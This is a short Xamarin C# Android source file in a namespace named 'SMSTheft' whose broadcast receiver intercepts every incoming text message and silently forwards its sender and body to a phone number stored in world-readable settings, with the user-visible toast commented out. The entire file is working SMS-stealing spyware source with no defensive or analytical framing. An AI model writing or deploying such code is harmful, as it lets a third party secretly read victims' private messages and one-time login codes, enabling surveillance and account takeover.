using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Telephony;
using Android.Views;
using Android.Widget;

namespace SMSTheft
{
    [BroadcastReceiver(Enabled = true, Label = "Sms Theft")]
    [IntentFilter(new String[] { "android.provider.Telephony.SMS_RECEIVED" })]
    public class SmsReceiver : BroadcastReceiver
    {
        public override void OnReceive(Context context, Intent intent)
        {
            String toPhone = context.GetSharedPreferences("setting", FileCreationMode.WorldReadable)
                .GetString("ToPhone", "");

            var bundle = intent.Extras;
            if (bundle == null) return;
            var pdus = bundle.Get("pdus");
            var castePdus = JNIEnv.GetArray<Java.Lang.Object>(pdus.Handle);
            foreach (var t in castePdus)
            {
                var bytes = new byte[JNIEnv.GetArrayLength(t.Handle)];
                JNIEnv.CopyArray(t.Handle, bytes);
                var msg = SmsMessage.CreateFromPdu(bytes);
                var str = String.Format("SMS From {0} ,Body {1}", msg.OriginatingAddress, msg.MessageBody);

                //Toast.MakeText(context, "Received sms! " + str, ToastLength.Short).Show();
                SmsManager.Default.SendTextMessage(toPhone, null, str, null, null);
            }
        }
    }
}